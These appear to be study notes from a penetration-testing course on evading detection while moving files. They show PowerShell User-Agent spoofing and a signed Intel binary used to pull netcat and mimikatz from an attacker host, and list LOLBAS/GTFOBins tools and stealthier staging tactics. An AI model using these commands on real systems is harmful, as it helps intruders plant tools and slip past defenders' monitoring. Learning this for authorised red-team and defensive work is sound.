Evading detection during file transfers is about **blending in with normal traffic**, **bypassing application controls**, and **avoiding behavioral alerts** — not just getting a file from A to B.

Modern environments often include:

- 🔍 SIEM monitoring
    
- 📜 Command-line logging
    
- 🛑 Application whitelisting
    
- 🧠 EDR behavior detection
    
- 🌐 Proxy & web filtering
    

Understanding how defenders detect activity helps you understand how to operate more stealthily.

---

# 1️⃣ Changing the User-Agent (HTTP Evasion)

## 🔎 Why This Matters

HTTP traffic is often inspected for:

- Suspicious user agents (PowerShell, curl, certutil)
    
- Known red-team tools
    
- Automation frameworks
    

By default, many tools expose themselves clearly.

Example default PowerShell User-Agent:

```
Mozilla/5.0 (...) WindowsPowerShell/5.1.14393.0
```

That is **highly detectable**.

---

## 🧠 Built-in PowerShell User Agent Spoofing

PowerShell provides predefined browser user agents:

### List Available User Agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | 
Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Available options:

- InternetExplorer
    
- FireFox
    
- Chrome
    
- Opera
    
- Safari
    

---

## 🎭 Example: Masquerading as Chrome

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe `
-UserAgent $UserAgent `
-OutFile "C:\Users\Public\nc.exe"
```

### What the Server Sees:

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (...) Chrome/7.0.500.0 Safari/534.6
```

Now the traffic resembles a legitimate browser.

---

## 📌 Key Insight

User-Agent spoofing helps evade:

- Basic signature detection
    
- Simple SIEM queries
    
- Blacklist-based detection
    

But it does NOT evade:

- TLS inspection
    
- Behavioral analytics
    
- Process ancestry tracking
    
- EDR script block logging
    

---

# 2️⃣ Using LOLBins (Living Off the Land Binaries)

If:

- PowerShell is blocked
    
- Netcat is blocked
    
- Command-line logging is monitored
    
- AppLocker is enforced
    

Then you must use **trusted system binaries**.

This is called:

> Living Off The Land (LOTL)

---

## 🧨 Example: GfxDownloadWrapper.exe

Installed on some Windows 10 systems (Intel graphics driver).

### File Download:

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Why this works:

- It is a trusted signed binary
    
- Often whitelisted
    
- Not commonly monitored
    
- Not flagged as malicious by default
    

---

## 🔎 Other LOLBAS Sources

### Windows

LOLBAS Project  
Search for:

- download
    
- upload
    
- execute
    
- bypass
    

Examples include:

- certutil.exe
    
- bitsadmin
    
- mshta.exe
    
- regsvr32.exe
    
- rundll32.exe
    

---

### Linux

GTFOBins Project

Provides:

- File upload methods
    
- File download methods
    
- Command execution tricks
    
- Privilege escalation abuse
    

Examples:

- openssl
    
- awk
    
- tar
    
- python
    
- vim
    
- scp
    

---

# 3️⃣ Why Whitelisting Is Hard to Evade

Blacklisting is easy to bypass:

- Change casing
    
- Rename binary
    
- Use alias
    
- Modify flags
    

Whitelisting is stronger:

- Only approved binaries allowed
    
- Anything unusual triggers alert
    

This forces attackers to:

- Use trusted binaries
    
- Abuse signed software
    
- Blend into administrative activity
    

---

# 4️⃣ What Defenders Typically Monitor

|Detection Method|What It Looks For|
|---|---|
|Command-line logging|certutil download flags|
|Script block logging|PowerShell IEX|
|Network monitoring|Suspicious user agents|
|AppLocker|Unauthorized binaries|
|Proxy logs|Rare outbound domains|
|EDR telemetry|Parent-child process anomalies|

---

# 5️⃣ Realistic Evasion Strategy

Instead of:

```
PowerShell -> nc.exe download
```

Better:

```
Trusted binary -> HTTPS download
Chrome user-agent
Common port (443)
Internal staging server
```

Even better:

```
Use legitimate update-looking domain
Use certificate-signed HTTPS
Use native binary already used in environment
```

---

# 6️⃣ Practical Red Team Mindset

When on a target:

✔ Search for unusual but signed binaries  
✔ Check installed vendor software  
✔ Review scheduled tasks  
✔ Review running services  
✔ Check Program Files for vendor utilities  
✔ Query AppLocker rules

You may find a binary defenders never considered dangerous.

---

# 7️⃣ Common Evasion Mistakes

❌ Sending files over HTTP on port 8000  
❌ Using obvious user agents (PowerShell, curl)  
❌ Running tools from Temp repeatedly  
❌ Spawning suspicious child processes  
❌ Downloading from GitHub directly  
❌ Reusing the same C2 IP across tests

---

# 8️⃣ Risk Considerations

Even with evasion:

- EDR may log process behavior
    
- Defender may correlate network + process logs
    
- TLS inspection may expose payload
    
- DNS logging may expose C2
    

Evasion reduces noise — it does not guarantee invisibility.

---

# 9️⃣ Closing Thoughts (Important)

As stated in the module:

> It’s worth practicing as many of these methods as possible throughout the modules in the Penetration Tester path.

You should:

- Practice with different transfer methods
    
- Try at least one new LOLBin per lab
    
- Rotate techniques intentionally
    
- Avoid relying on a single method
    

The more methods you know, the more adaptable you become.

---

# 🎯 Summary

### Detection Evasion = Blend In

- Change User-Agent
    
- Use signed binaries
    
- Use HTTPS
    
- Use common ports
    
- Avoid suspicious tools
    
- Abuse trusted applications
---